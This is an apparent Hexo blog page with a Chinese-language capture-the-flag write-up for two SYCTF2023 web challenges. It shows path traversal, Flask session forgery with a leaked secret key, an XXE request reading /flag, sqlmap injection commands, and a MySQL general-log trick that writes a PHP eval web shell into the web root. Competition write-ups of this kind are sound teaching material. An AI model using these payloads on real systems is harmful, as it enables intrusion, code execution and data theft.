@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>SYCTF2023 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="WebCarelessPy 先大概看一下有哪几个功能  主界面有一个下载文件 “ctrl+u” 查看源代码发现两个页面 “&#x2F;eval” 和 “&#x2F;login”   根据消息头 “Server: Werkzeug&#x2F;1.0.1 Python&#x2F;3.11.3”、 “&#x2F;eval”回显是列表格式等判断是 “python flask”, 且 “&#x2F;eval">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SYCTF2023">
+<meta property="og:url" content="http://example.com/2023/06/11/SYCTF2023/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="WebCarelessPy 先大概看一下有哪几个功能  主界面有一个下载文件 “ctrl+u” 查看源代码发现两个页面 “&#x2F;eval” 和 “&#x2F;login”   根据消息头 “Server: Werkzeug&#x2F;1.0.1 Python&#x2F;3.11.3”、 “&#x2F;eval”回显是列表格式等判断是 “python flask”, 且 “&#x2F;eval">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-06-10T17:11:07.000Z">
+<meta property="article:modified_time" content="2023-06-10T17:17:01.162Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-SYCTF2023" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/06/11/SYCTF2023/" class="article-date">
+  <time class="dt-published" datetime="2023-06-10T17:11:07.000Z" itemprop="datePublished">2023-06-11</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/SYCTF2023/">SYCTF2023</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      SYCTF2023
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h3 id="CarelessPy"><a href="#CarelessPy" class="headerlink" title="CarelessPy"></a>CarelessPy</h3><ol>
+<li><p>先大概看一下有哪几个功能</p>
+<ul>
+<li>主界面有一个下载文件</li>
+<li>“ctrl+u” 查看源代码发现两个页面 “&#x2F;eval” 和 “&#x2F;login”</li>
+</ul>
+</li>
+<li><p>根据消息头 “Server: Werkzeug&#x2F;1.0.1 Python&#x2F;3.11.3”、 “&#x2F;eval”回显是列表格式等判断是 “python flask”, 且 “&#x2F;eval” 使用了 “os.listdir()”函数</p>
+</li>
+<li><p>用主界面下载文件功能下载 “&#x2F;download?file&#x3D;..&#x2F;..&#x2F;..&#x2F;flag” 和 “download?file&#x3D;..&#x2F;app.py” 均被 “杂鱼”</p>
+</li>
+<li><p>下载 “&#x2F;download?file&#x3D;..&#x2F;..&#x2F;..&#x2F;app&#x2F;<strong>pycache</strong>&#x2F;part.cpython-311.pyc” 反编译查看 SECRET_KEY 伪造session</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit https://tool.lu/pyc/ for more information</span></span><br><span class="line"><span class="comment"># Version: Python 3.11</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;o2takuXX_donot_like_ntr&#x27;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>进&#x2F;login随便输入然后登陆</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">python3 flask_session_cookie_manager3.py encode -s <span class="string">&#x27;o2takuXX_donot_like_ntr&#x27;</span> -t <span class="string">&quot;&#123;&#x27;islogin&#x27;: True&#125;&quot;</span></span></span><br><span class="line">eyJpc2xvZ2luIjp0cnVlfQ.ZIRGnA.z_rjwZz9VUGalSyoNK6fo_7Jv2I</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>提示访问 “&#x2F;th1s_1s_The_L4st_one”</p>
+</li>
+<li><p>简单的XXE</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">GET /th1s_1s_The_L4st_one HTTP/1.1</span><br><span class="line">Host: 47.108.165.60:37034</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: session=eyJpc2xvZ2luIjp0cnVlfQ.ZIRGnA.z_rjwZz9VUGalSyoNK6fo_7Jv2I</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 157</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE GVI [</span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;result&gt;</span><br><span class="line">    &lt;ctf&gt;杂鱼~&lt;/ctf&gt;</span><br><span class="line">    &lt;web&gt;&amp;xxe;&lt;/web&gt;</span><br><span class="line">&lt;/result&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.0 200 OK</span><br><span class="line">Content-Type: text/xml;charset=UTF-8</span><br><span class="line">Content-Length: 80</span><br><span class="line">Vary: Cookie</span><br><span class="line">Server: Werkzeug/1.0.1 Python/3.11.3</span><br><span class="line">Date: Sat, 10 Jun 2023 11:30:12 GMT</span><br><span class="line"></span><br><span class="line">&lt;result&gt;&lt;ctf&gt;杂鱼~&lt;/ctf&gt;&lt;web&gt;SYCTF&#123;corrEC7_aNswER_c720bd6582bf&#125;&lt;/web&gt;&lt;/result&gt;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="Confronting-robot"><a href="#Confronting-robot" class="headerlink" title="Confronting robot"></a>Confronting robot</h3><ol>
+<li><p>经典单引号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Warning:  mysqli_fetch_array() expects parameter 1 to be mysqli_result, bool given in /var/www/html/index.php on line 23</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Sqlmap (别骂了我知道没有灵魂</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://47.108.165.60:47293/?myname=1 --dbs --batch</span><br><span class="line">sqlmap -u http://47.108.165.60:47293/?myname=1 -D robot_data --tables --batch</span><br><span class="line">sqlmap -u http://47.108.165.60:47293/?myname=1 -D robot_data -T name --columns --batch</span><br><span class="line"></span><br><span class="line">Database: robot_data</span><br><span class="line">Table: name</span><br><span class="line">[1 column]</span><br><span class="line">+----------+--------------+</span><br><span class="line">| Column   | Type         |</span><br><span class="line">+----------+--------------+</span><br><span class="line">| username | varchar(256) |</span><br><span class="line">+----------+--------------+</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://47.108.165.60:47293/?myname=1 -D robot_data -T name -C username --dump --batch</span><br><span class="line"></span><br><span class="line">+-------------------------------------+</span><br><span class="line">| username                            |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">| Hacker                              |</span><br><span class="line">| secret is in /sEcR@t_n@Bodyknow.php |</span><br><span class="line">+-------------------------------------+</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>访问 “&#x2F;sEcR@<a href="mailto:&#116;&#95;&#x6e;&#x40;&#x42;&#111;&#x64;&#121;&#107;&#x6e;&#x6f;&#119;&#x2e;&#112;&#104;&#x70;">&#116;&#95;&#x6e;&#x40;&#x42;&#111;&#x64;&#121;&#107;&#x6e;&#x6f;&#119;&#x2e;&#112;&#104;&#x70;</a>“ 发现几个可用页面</p>
+<ul>
+<li><p>传输 POST 传code</p>
+</li>
+<li><p>开始挑战, 跳到game.php, 随便填几个RPS, 发现会跟 NULL 比值</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Notice:  Trying to access <span class="keyword">array</span> offset on value of type <span class="literal">null</span> in /<span class="keyword">var</span>/www/html/game.php on line <span class="number">31</span></span><br><span class="line"></span><br><span class="line">Notice:  Trying to access <span class="keyword">array</span> offset on value of type <span class="literal">null</span> in /<span class="keyword">var</span>/www/html/game.php on line <span class="number">31</span></span><br><span class="line"></span><br><span class="line">Notice:  Trying to access <span class="keyword">array</span> offset on value of type <span class="literal">null</span> in /<span class="keyword">var</span>/www/html/game.php on line <span class="number">31</span></span><br><span class="line"></span><br><span class="line">Notice:  Trying to access <span class="keyword">array</span> offset on value of type <span class="literal">null</span> in /<span class="keyword">var</span>/www/html/game.php on line <span class="number">31</span></span><br><span class="line"></span><br><span class="line">Notice:  Trying to access <span class="keyword">array</span> offset on value of type <span class="literal">null</span> in /<span class="keyword">var</span>/www/html/game.php on line <span class="number">31</span></span><br><span class="line"></span><br><span class="line">Notice:  Trying to access <span class="keyword">array</span> offset on value of type <span class="literal">null</span> in /<span class="keyword">var</span>/www/html/game.php on line <span class="number">31</span></span><br><span class="line"></span><br><span class="line">Notice:  Trying to access <span class="keyword">array</span> offset on value of type <span class="literal">null</span> in /<span class="keyword">var</span>/www/html/game.php on line <span class="number">31</span></span><br><span class="line"></span><br><span class="line">Notice:  Trying to access <span class="keyword">array</span> offset on value of type <span class="literal">null</span> in /<span class="keyword">var</span>/www/html/game.php on line <span class="number">31</span></span><br><span class="line"></span><br><span class="line">Notice:  Trying to access <span class="keyword">array</span> offset on value of type <span class="literal">null</span> in /<span class="keyword">var</span>/www/html/game.php on line <span class="number">31</span></span><br><span class="line"></span><br><span class="line">Notice:  Trying to access <span class="keyword">array</span> offset on value of type <span class="literal">null</span> in /<span class="keyword">var</span>/www/html/game.php on line <span class="number">31</span></span><br><span class="line"></span><br><span class="line">Fatal error:  Uncaught <span class="built_in">TypeError</span>: Argument <span class="number">2</span> passed to  <span class="title function_ invoke__">loseorwin</span>() must be of the type <span class="keyword">string</span>, <span class="literal">null</span> given, called in  /<span class="keyword">var</span>/www/html/game.php on line <span class="number">38</span> <span class="keyword">and</span> defined in  /<span class="keyword">var</span>/www/html/game.php:<span class="number">11</span> Stack trace: <span class="comment">#0 /var/www/html/game.php(38): loseorwin(&#x27;R&#x27;, NULL) #1 &#123;main&#125;   thrown in /var/www/html/game.php on line 11</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Notice:  Trying to access <span class="keyword">array</span> offset on value of type <span class="literal">null</span> in /<span class="keyword">var</span>/www/html/game.php on line <span class="number">31</span></span><br><span class="line"></span><br><span class="line">Notice:  Trying to access <span class="keyword">array</span> offset on value of type <span class="literal">null</span> in /<span class="keyword">var</span>/www/html/game.php on line <span class="number">31</span></span><br><span class="line"></span><br><span class="line">Notice:  Trying to access <span class="keyword">array</span> offset on value of type <span class="literal">null</span> in /<span class="keyword">var</span>/www/html/game.php on line <span class="number">31</span></span><br><span class="line"></span><br><span class="line">Notice:  Trying to access <span class="keyword">array</span> offset on value of type <span class="literal">null</span> in /<span class="keyword">var</span>/www/html/game.php on line <span class="number">31</span></span><br><span class="line"></span><br><span class="line">Notice:  Trying to access <span class="keyword">array</span> offset on value of type <span class="literal">null</span> in /<span class="keyword">var</span>/www/html/game.php on line <span class="number">31</span></span><br><span class="line"></span><br><span class="line">Notice:  Trying to access <span class="keyword">array</span> offset on value of type <span class="literal">null</span> in /<span class="keyword">var</span>/www/html/game.php on line <span class="number">31</span></span><br><span class="line"></span><br><span class="line">Notice:  Trying to access <span class="keyword">array</span> offset on value of type <span class="literal">null</span> in /<span class="keyword">var</span>/www/html/game.php on line <span class="number">31</span></span><br><span class="line"></span><br><span class="line">Notice:  Trying to access <span class="keyword">array</span> offset on value of type <span class="literal">null</span> in /<span class="keyword">var</span>/www/html/game.php on line <span class="number">31</span></span><br><span class="line"></span><br><span class="line">Notice:  Trying to access <span class="keyword">array</span> offset on value of type <span class="literal">null</span> in /<span class="keyword">var</span>/www/html/game.php on line <span class="number">31</span></span><br><span class="line"></span><br><span class="line">Notice:  Trying to access <span class="keyword">array</span> offset on value of type <span class="literal">null</span> in /<span class="keyword">var</span>/www/html/game.php on line <span class="number">31</span></span><br><span class="line"></span><br><span class="line">Fatal error:  Uncaught <span class="built_in">TypeError</span>: Argument <span class="number">2</span> passed to  <span class="title function_ invoke__">loseorwin</span>() must be of the type <span class="keyword">string</span>, <span class="literal">null</span> given, called in  /<span class="keyword">var</span>/www/html/game.php on line <span class="number">38</span> <span class="keyword">and</span> defined in  /<span class="keyword">var</span>/www/html/game.php:<span class="number">11</span> Stack trace: <span class="comment">#0 /var/www/html/game.php(38): loseorwin(&#x27;&#x27;, NULL) #1 &#123;main&#125;   thrown in /var/www/html/game.php on line 11</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p>Sqlmap 爆code, 步骤就不放了level和risk都不用, 发现 “choice” 和 “round” 均空表, 再结合 “game.php” 会跟NULL 比值报错</p>
+<ul>
+<li><p>第一种想法是手动填写机器人的参数然后赢十回合得到flag。后经验证没写出来(我太菜了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Database: game_data</span><br><span class="line">Table: game</span><br><span class="line">[2 columns]</span><br><span class="line">+--------+--------------+</span><br><span class="line">| Column | Type         |</span><br><span class="line">+--------+--------------+</span><br><span class="line">| choice | varchar(256) |</span><br><span class="line">| round  | int(255)     |</span><br><span class="line">+--------+--------------+</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Database: game_data</span><br><span class="line">Table: game</span><br><span class="line">[0 entries]</span><br><span class="line">+--------+</span><br><span class="line">| choice |</span><br><span class="line">+--------+</span><br><span class="line">+--------+</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p>再看 “&#x2F;sEcR@<a href="mailto:&#x74;&#95;&#x6e;&#64;&#66;&#x6f;&#x64;&#x79;&#107;&#110;&#x6f;&#x77;&#46;&#112;&#x68;&#112;">&#x74;&#95;&#x6e;&#64;&#66;&#x6f;&#x64;&#x79;&#107;&#110;&#x6f;&#x77;&#46;&#112;&#x68;&#112;</a>“ 传空参可以得到两个函数 “mysqli_query()” 和 “mysqli_fetch_all()”, 试着写马传了一下, 然后sql日志写马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &quot;%general%&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rray(2) &#123;   [0]=&gt;   array(2) &#123;     [0]=&gt;     string(11) &quot;general_log&quot;     [1]=&gt;     string(3) &quot;OFF&quot;   &#125;   [1]=&gt;   array(2) &#123;     [0]=&gt;     string(16) &quot;general_log_file&quot;     [1]=&gt;     string(39) &quot;web-pursue0h-robot-5754af205ee949e0.log&quot;   &#125; &#125;         </span><br></pre></td></tr></table></figure>
+</li>
+<li><p>继续传发现 secure_file_priv 为空</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &#x27;%secure%&#x27;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array(3) &#123;   [0]=&gt;   array(2) &#123;     [0]=&gt;     string(11) &quot;secure_auth&quot;     [1]=&gt;     string(2) &quot;ON&quot;   &#125;   [1]=&gt;   array(2) &#123;     [0]=&gt;     string(16) &quot;secure_file_priv&quot;     [1]=&gt;     string(0) &quot;&quot;   &#125;   [2]=&gt;   array(2) &#123;     [0]=&gt;     string(16) &quot;secure_timestamp&quot;     [1]=&gt;     string(2) &quot;NO&quot;   &#125; &#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>试着写马</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log<span class="operator">=</span><span class="string">&#x27;on&#x27;</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file<span class="operator">=</span><span class="string">&#x27;/var/www/html/shell.php&#x27;</span></span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php eval($_REQUEST[&#x27;</span>cmd<span class="string">&#x27;]);?&gt;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>访问 shell.php 发现Access denied , 试了好几个网页都不行, 那就写在 “&#x2F;sEcR@<a href="mailto:&#116;&#95;&#110;&#x40;&#66;&#111;&#100;&#x79;&#107;&#x6e;&#x6f;&#x77;&#46;&#112;&#104;&#112;">&#116;&#95;&#110;&#x40;&#66;&#111;&#100;&#x79;&#107;&#x6e;&#x6f;&#x77;&#46;&#112;&#104;&#112;</a>“ 里</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set global general_log_file=&#x27;/var/www/html//sEcR@t_n@Bodyknow.php&#x27;</span><br><span class="line">select &#x27;&lt;?php eval($_REQUEST[&#x27;cmd&#x27;]);?&gt;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>访问成功，蚁剑链接之后根目录没找见, 想起来 “game.php”</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">……</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;round1&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$count</span>==<span class="number">10</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;SYCTF&#123;r06oT_rOboT_2ae2985843f4&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;你输了&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">……</span><br></pre></td></tr></table></figure></li>
+</ol>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/06/11/SYCTF2023/" data-id="cliq9e81o0000nsuzcfdp3uiq" data-title="SYCTF2023" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2023/06/09/20230609/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">20230609</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTFshow/">CTFshow</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/SYCTF2023/">SYCTF2023</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/buuctf/">buuctf</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/ciscn/">ciscn</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/shaanxi/">shaanxi</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/06/">June 2023</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/06/11/SYCTF2023/">SYCTF2023</a>
+          </li>
+        
+          <li>
+            <a href="/2023/06/09/20230609/">20230609</a>
+          </li>
+        
+          <li>
+            <a href="/2023/06/08/shaanxi/">shaanxi</a>
+          </li>
+        
+          <li>
+            <a href="/2023/06/01/web171-253/">web171-253</a>
+          </li>
+        
+          <li>
+            <a href="/2023/06/01/web1-web28/">Web1 - Web28</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2023 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
